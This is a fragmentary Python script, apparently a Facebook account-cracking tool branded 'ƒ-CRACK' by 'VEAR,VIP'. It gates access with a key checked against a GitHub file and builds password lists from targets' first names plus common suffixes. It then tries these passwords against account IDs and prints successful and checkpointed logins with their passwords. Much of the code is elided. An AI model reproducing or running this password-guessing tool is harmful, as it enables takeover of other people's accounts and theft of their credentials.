...
try: 
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[Killer')
...
def Subscraption():
	...
	os.system('clear')
	banner()
	r1=requests.get("https://raw.githubusercontent.com/Crazy835194610/ittz_cr4zy/main/README.md").text
	if key1 in r1:
		os.system('clear')
		banner()
		menu()
		...
		os.system('am start https://t.me/KILLER_CRACK' + tks) 
		#Subscraption()
...
\x1b[38;5;46m______________________________________________________
 ...
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER : 🔥FB//HACK🔥
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m DEVELOPER2: 🔥VEAR,VIP🔥 
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m GITHUB    :   VEAR,,
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m TOOLS     :   ƒ-CRACK
 \033[1;31m[\033[1;32m⊡\033[1;31m]\033[1;32m VERSION   :  \033[1;31m V=[16]
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append(frs+'2022')
					pwv.append(frs+'@@')
					pwv.append(frs+'vear123vear')
					pwv.append(frs+'vear nvar soz')
					pwv.append(frs+'vear1976')
					pwv.append(frs+'vear12345pana')
					pwv.append(frs+'vear123soz123')
					pwv.append(frs+'nvar564soz11')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [VEAR,VIP] {h}{loop}|{len(id)} | {h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[VEAR,VIP-CP] {idf} | {pw}')     
				...
				#print ()
				print(f'\r\r\x1b[38;5;46m[VEAR,VIP-OK💉] '+idf+ ' | '+pw+'')
